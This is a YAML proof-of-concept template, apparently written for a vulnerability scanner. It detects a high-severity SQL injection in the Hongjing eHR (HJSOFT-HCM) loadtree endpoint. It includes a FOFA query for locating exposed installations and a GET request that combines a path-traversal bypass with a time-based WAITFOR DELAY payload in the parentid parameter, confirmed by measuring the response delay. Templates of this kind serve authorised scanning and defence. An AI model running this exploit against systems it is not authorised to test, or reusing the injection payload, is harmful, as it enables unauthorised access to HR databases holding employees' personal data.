id: poc-yaml-hongjing-ehr-loadtree-sqli
info:
  name: 宏景eHR loadtree SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 宏景eHR
  fofa: app="HJSOFT-HCM"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /templates/index/hcmlogon.jsp
  expression: status_code == 200 && contains(body,"/css/hcm/login.css")
- method: GET
  path: /w_selfservice/oauthservlet/%2e./.%2e/common/org/loadtree?params=child&treetype=1&parentid=1%27%3BWAITFOR+DELAY+%270%3A0%3A{{.t1}}%27--&kind=2&issuperuser=1&manageprive=1&action=1&target=1&backdate=1&jump=1
  expression: 'status_code == 200 &&

    contains(content_type,"text/xml") &&

    body == "" &&

    duration > t1 &&

    duration < t2

    '
transport: http
